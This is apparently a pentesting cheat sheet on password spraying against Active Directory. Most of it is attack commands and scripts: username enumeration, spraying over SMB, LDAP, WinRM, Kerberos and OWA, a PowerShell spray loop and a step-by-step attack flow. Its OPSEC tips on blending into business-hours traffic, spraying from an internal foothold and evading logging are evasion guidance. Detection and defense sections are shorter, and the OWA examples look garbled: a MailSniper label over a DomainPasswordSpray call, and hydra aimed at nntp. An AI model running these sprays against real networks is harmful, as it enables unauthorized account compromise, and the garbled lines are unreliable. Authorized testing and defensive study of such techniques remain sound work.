# Password Spraying

Test a **single weak password** against many usernames to avoid account lockouts. Targets SMB, LDAP, Kerberos, OWA, and other auth endpoints.

## How It Works

```
Attacker ──► Auth attempt (username1:Password1) ──► DC
Attacker ──► Auth attempt (username2:Password1) ──► DC
Attacker ──► Auth attempt (username3:Password1) ──► DC
... (wait for lockout window) ...
Attacker ──► Auth attempt (username1:Summer2026!) ──► DC
```

## Prerequisites

- Valid username list
- Network connectivity to DC or domain-joined machine
- Target password (common weak passwords: `Password1`, `Welcome1`, `Summer2026!`, season+year patterns)

## Username Enumeration First

### Kerbrute (AS-REP prefetch — no lockout risk)
```bash
kerbrute userenum -d domain.local --dc 10.10.10.10 /usr/share/wordlists/names.txt
```

### NetExec SMB
```bash
nxc smb 10.10.10.10 -u usernames.txt -p 'doesntmatter' --continue-on-success 2>/dev/null
# Watch for "STATUS_LOGON_FAILURE" vs "STATUS_ACCOUNT_RESTRICTION"
```

### ldapsearch (anonymous bind)
```bash
ldapsearch -h 10.10.10.10 -x -b "DC=domain,DC=local" "(&(objectClass=user))" sAMAccountName | grep sAMAccountName
```

## Linux — NetExec (Primary)

### Spray single password against user list
```bash
nxc smb 10.10.10.10 -u users.txt -p 'Password1' --continue-on-success
```

### Spray across multiple targets
```bash
nxc smb 10.10.10.10 10.10.10.11 10.10.10.12 -u users.txt -p 'Password1' --continue-on-success
```

### Spray with a single password against all domain users (from LDAP)
```bash
nxc smb 10.10.10.10 -u users.txt -p 'Password1' --continue-on-success --no-bruteforce
```

### Spray multiple passwords (1 password per execution — careful of lockouts!)
```bash
for p in Password1 Welcome1 Summer2026!; do
    nxc smb 10.10.10.10 -u users.txt -p "$p" --continue-on-success
    sleep 60  # wait between passwords
done
```

### Spray against LDAP
```bash
nxc ldap 10.10.10.10 -u users.txt -p 'Password1' --continue-on-success
```

### Spray against WinRM
```bash
nxc winrm 10.10.10.10 -u users.txt -p 'Password1' --continue-on-success
```

## Linux — Kerbrute

### Password spray via Kerberos (less logging)
```bash
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password1'
```

### With delay (avoids rapid-fire detection)
```bash
kerbrute passwordspray -d domain.local --dc 10.10.10.10 -v users.txt 'Password1' --delay 100
```

### Verify valid credentials found
```bash
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password1' | grep VALID
```

## Windows — DomainPasswordSpray

```powershell
# Import module
Import-Module .\DomainPasswordSpray.ps1

# Spray with a single password
Invoke-DomainPasswordSpray -Password 'Password1' -OutFile spray_results.txt

# Spray with verbose output
Invoke-DomainPasswordSpray -Password 'Password1' -Verbose

# Spray against specific user list
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 'Password1' -Domain domain.local
```

## Windows — Manual PowerShell

```powershell
$domain = "domain.local"
$users = Get-Content .\users.txt
$password = "Password1"

foreach ($user in $users) {
    try {
        $cred = New-Object System.Management.Automation.PSCredential("$domain\$user", (ConvertTo-SecureString $password -AsPlainText -Force))
        $logon = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain, $domain)
        if ($logon.ValidateCredentials($user, $password)) {
            Write-Output "VALID: $user"
        } else {
            Write-Output "FAIL: $user"
        }
    } catch {}
}
```

## Attacking OWA / Exchange

```bash
# Using MailSniper (PowerShell)
Invoke-DomainPasswordSpray -OWA -OutFile spray_results.txt -Password 'Password1'

# Using hydra (less common, very noisy)
hydra -L users.txt -p Password1 10.10.10.10 nntp -V
```

## Full Attack Flow

```
1. Enumerate valid usernames
   kerbrute userenum -d domain.local --dc 10.10.10.10 names.txt > valid_users.txt

2. Extract usernames from output
   grep VALID valid_users.txt | cut -d' ' -f8 > users_clean.txt

3. Determine password policy (lockout threshold, bad password count)
   netexec smb 10.10.10.10 -u 'validuser' -p 'password' --pass-pol

4. Spray common seasonal password
   netexec smb 10.10.10.10 -u users_clean.txt -p 'Winter2026!' --continue-on-success

5. Wait 30 min for lockout window, try next password
   netexec smb 10.10.10.10 -u users_clean.txt -p 'Password1' --continue-on-success

6. Spray via Kerberos (less logging)
   kerbrute passwordspray -d domain.local --dc 10.10.10.10 users_clean.txt 'Spring2026!'
```

## Password Policy Discovery

```bash
# From an already valid account
netexec smb 10.10.10.10 -u 'user' -p 'pass' --pass-pol

# Without credentials (null session — rare on modern AD)
netexec smb 10.10.10.10 -u '' -p '' --pass-pol
```

## Detection & Signatures

**Windows Event Logs:**
- **Event ID 4625** — Logon failure; look for:
  - Same `LogonType: 3` (network)
  - Same source IP with different target usernames
  - Multiple `SubStatus: 0xC000006D` (bad password) for different users
- **Event ID 4771** — Kerberos pre-authentication failed
- **Event ID 4776** — Credential validation (NTLM)

**Lockout Alert:**
- **Event ID 4740** — User account locked out; indicates aggressive spraying

**Network Signatures:**
- Multiple SMB sessions from one IP to one target IP
- Sequential Kerberos AS-REQ with different usernames, same password
- Rapid auth attempts followed by gaps (spray pattern)

**Hunting Query (KQL):**
```
EventID: 4625
| where LogonType == 3
| summarize FailedAttempts = count() by IpAddress, AccountName
| where FailedAttempts > 20
```

## Safe Thresholds

| Lockout Threshold | Max Attempts per Period | Wait Time |
|-------------------|------------------------|-----------|
| 10 (default) | 8 attempts | 30 min |
| 5 | 4 attempts | 30 min |
| 3 | 2 attempts | 60 min |
| 0 (no lockout) | Unlimited | — |

## OPSEC Considerations

- **Account lockout is loud** — Exceeds threshold and SOC gets alerted immediately
- **One password per execution** — Never spray multiple passwords in one run
- **Target DC first** — DC authentication logs more than member servers
- **Kerberos spraying** — Kerbrute via Kerberos logs less than NTLM/SMB
- **Time of day** — Spray during business hours (blends with normal auth traffic)
- **Source IP** — Use a foothold system inside the network, not your external IP
- **SLOW DOWN** — Add random delays between attempts

## Defenses

- **Enable account lockout** (default: 10 bad attempts, 30 min lockout)
- **Set "Lockout threshold"** low (3-5 attempts)
- **Monitor** — Alert on >10 failures from one IP in 5 minutes
- **MFA** — Require MFA for all external and sensitive auth
- **Disable legacy auth** — Block NTLMv1, restrict NTLMv2
- **Audit logs** — Forward 4625 to SIEM
- **Honeypot accounts** — Create fake users that trigger alert on any auth attempt

## References

- NetExec: https://github.com/Pennyw0rth/NetExec
- Kerbrute: https://github.com/ropnop/kerbrute
- DomainPasswordSpray: https://github.com/dafthack/DomainPasswordSpray
- MailSniper: https://github.com/dafthack/MailSniper
